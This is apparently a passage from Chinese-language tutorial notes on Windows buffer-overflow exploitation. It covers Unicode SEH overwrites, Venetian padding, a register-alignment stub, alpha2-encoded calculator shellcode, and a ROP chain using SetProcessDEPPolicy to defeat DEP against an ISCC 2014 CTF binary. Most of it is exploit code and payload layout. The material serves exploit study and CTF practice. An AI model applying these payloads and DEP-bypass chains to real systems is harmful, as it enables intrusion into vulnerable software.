      * 触发漏洞状态。
      * 可以看到，该程序适宜unicode编码的，我们所有的输入也是被转为unicode。
      * 依然测出seh的偏移，这次我们只用2byte的nseh和seh来覆盖，看看unicode模式下是什么样的
                        padding = "a"*536
            nseh = "nn"
            seh = "ss"
            exploit = padding + nseh + seh + "a"*4464
可以看到两个"n"和"s"分别扩展为0x006e006e和0x00730073，
      * ###### 什么样的seh和nseh合适？
        * 在ascii编码下，seh是"pop pop ret"指令的地址。地址是有可能满足的。phrack在paper里这样说的
                                Under Win32 plateforms, a process usually starts at 00401000, this makes
                it possible to smash EIP with a return address that looks like : 
                                         ????:00??00??
mona插件也提供了unicode格式指令的搜索
        * 但是nseh之前是jmp指令（类似"\xeb\xff\x90\x90")，显然在unicode下是办不到的。但是我们可以使用一些无害的指令填充。如下
                                ASCII   ==> ...AAAA...
                Unicode ==> ...0041004100410041...
                But lets see what this looks like when it gets translated to instructions:
                ...
                41         INC ECX
                004100     ADD BYTE PTR DS:[ECX],AL
                41         INC ECX
                004100     ADD BYTE PTR DS:[ECX],AL
                ...
                So this is very very interesting! It seems like one byte will remain intact and the following byte will 
                "absorb" both 00's. What we will want to do is replace this second byte with an instruction that, when 
                executed, will be harmless (FYI 0x004100 is not a harmless instruction). You might call this a unicode NOP
                or Venetian Shellcode since canceling out 00's is similar to closing Venetian blinds. There are a couple 
                of candidates to absorb these 00's (these won't always be suitable):
                      006E00     ADD BYTE PTR DS:[ESI],CH
                      006F00     ADD BYTE PTR DS:[EDI],CH
                      007000     ADD BYTE PTR DS:[EAX],DH
                      007100     ADD BYTE PTR DS:[ECX],DH
                      007200     ADD BYTE PTR DS:[EDX],DH
                      007300     ADD BYTE PTR DS:[EBX],DH
    * 测试一下，（不是所有的"pop pop ret"地址都可用，因为nseh地址之后也会作为指令执行）
                padding = "a"*536
              nseh = "\x41\x71"
        seh = "\x41\x4d"
              exploit = padding + nseh + seh + "a"*4464
可以看到，已经执行了"pop pop ret"，且来到了指令"\x41\x00\x71"。
  * ###### shellcode的布置
    * 由于我们没有jmp到shellcode。所以需要手动将shellcode与某个寄存器对齐。（注意是指向shellcode第一个字节，而不是填充的nop）。一般是eax，因为汇编指令集对eax的优化，使得很多指令在eax上使用更方便（一字节）便于unicode编码。
        (1)找一个最接近我们缓冲区的寄存器然后通过增加/减小一些值使得它指向缓冲区的起始地址(也就是               Shellcode的地址) 
     (2在堆栈找一个指向我们缓冲区的地址, 通过pop送到EIP最终会转去执行我们的Shellcode.
    * 这里我们用第一种方式。
      ```python
      align = (
      '\x55'
      '\x71'
      '\x58'
      "\x71"                      #Venetian Padding
      "\x05\x20\x11"              #add eax,0x11002000  \
      "\x71"                      #Venetian Padding     |> +300
      "\x2d\x17\x11"              #sub eax,0x11001700  /
      "\x71"                      #Venetian Padding
      "\x50"                      #push EAX
      "\x71"                      #Venetian Padding
      "\xC3"                        #ret 
      )
      ```
    * 这段align会将eax指向我们输入内容中的一段地址，我们只需要计算下偏移，布置好shellcode就可以执行到那里。
    * 需要注意的是"\xc3"这条指令在不同语言下的unicode编码方式不一样，在en版下OK，但是zh下会编码为'\xca\x80'，导致失败（反正很迷）（我这里是手动改的。。。）[参见这里](https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf)
    * shellcode的生成借助alpha2编译器。,以下是eax指向shellcode时（弹出计算器）的unicode编码
      ```c
      shellcode = (
      "PPYAIAIAIAIAQATAXAZAPA3QADAZAB"
      "ARALAYAIAQAIAQAPA5AAAPAZ1AI1AIA"
      "IAJ11AIAIAXA58AAPAZABABQI1AIQIA"
      "IQI1111AIAJQI1AYAZBABABABAB30AP"
      "B944JBP199B1RH2CQQRL1SR4X86MMSDF3LKOHPA"
      )
      ```
  * 如果，我们不用push, ret的方式跳转到shellcode，而是一步步走到shellcode。
    * 注意将eax指向shellcode的首个非null byte。
    * eax的值，可以由ebp（栈的值，shellcode附近）经过计算（注意unicode对齐）布置到当前地址后一段。
    * 计算偏移，将shellcode布置到eax指向的位置。
    * 填充的"nop"，我一般用's'，在unicode下就是跳转到下一条指令。（当然也可以用前面提到的nop）
                jnc Label1
        Label1:
        align = (
    '\x55'
    '\x71'
    '\x58'
    "\x71"                      #Venetian Padding
    "\x05\x40\x11"              #add eax,0x11004000  \
    "\x71"                      #Venetian Padding     |> +3000
    "\x2d\x10\x11"              #sub eax,0x11001000  /
    "\x71"                      #Venetian Padding
    )
  * 这次就不要ret，直接平滑地“走到”shellcode。
  * ##### ROP方式绕过DEP
    * 和Linux下的绕过NX类似，圣斗士通过ROP chain来完成。
    * 不同的是，Windows下，我们可以先rop调用WIN API来关闭DEP保护或者重新定义属性，再执行位于stack上的shellcode。可用的WIN API如下
    * 布置的方式也有所不同，由于在Linux上完全是依赖代码片段来完成整个get shell的过程，因此在stack上的都是参数和可执行的地址，而在window上我们一般最终还是需要在stack上执行shellcode。所以需要保持代码段执行完毕后esp指向shellcode，之后ret或者jmp esp都可以完成。
    * 这里的stack的布置，我们只需要找到合适的"pop r32 retn"，"pushad retn"组合来将需要的片段放在合适的r32中，再通过pushad入栈。此时空间分布如下。注意，如果edi是"pop edi ret"，esi是啥就无所谓了。（反正只要能跳到API就行了）
    * 这样，在执行API关闭DEP之后，就可以顺利进入shellcode（仍然在stack中）。
    * 以ISCC 2014的一个pwn为例(shellcode.exe)，这里选用的API是SetProcessPolicy。
      * 确定偏移....
      * 主要是rop_chain的构造。
                rop_gadgets = [
              0x7c801d5d,  #RETN
              0x90909090,  #nops
              0x7c863e63,  # POP EBP # RETN [kernel32.dll] 
              0x7c862144,  # SetProcessDEPPolicy() [kernel32.dll]
              0x7c80dfdd,  # POP EBX # RETN [kernel32.dll] 
              0x00000000,  # dwFlag
              0x7c810afe,  # POP EDI # RETN [kernel32.dll] 
              0x7c810afe,  # skip 4 bytes [kernel32.dll]
              0x77d23ad9,  # PUSHAD # RETN  [User32.dll]
            ]
      * 注意，如果不可以传'\x00'这样的字节，可以通过指令运算来完成。
      * 这里有个有趣的，调试过程中发现如果在0x7c801d5d下了断点，shellcode就会异常中断。猜测是由于断点的地方改变了一个字节。
参考链接
[看教程学溢出之SEH利用](http://blog.nsfocus.net/tutorial-overflow/)
[EggHunter_paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
[Unicode的shellcode补充](https://bbs.pediy.com/thread-121281.htm)
[phrack关于unicode攻击特殊shellcode构成](http://phrack.org/issues/61/11.html#article)
[Unicode详情](www.unicode.org)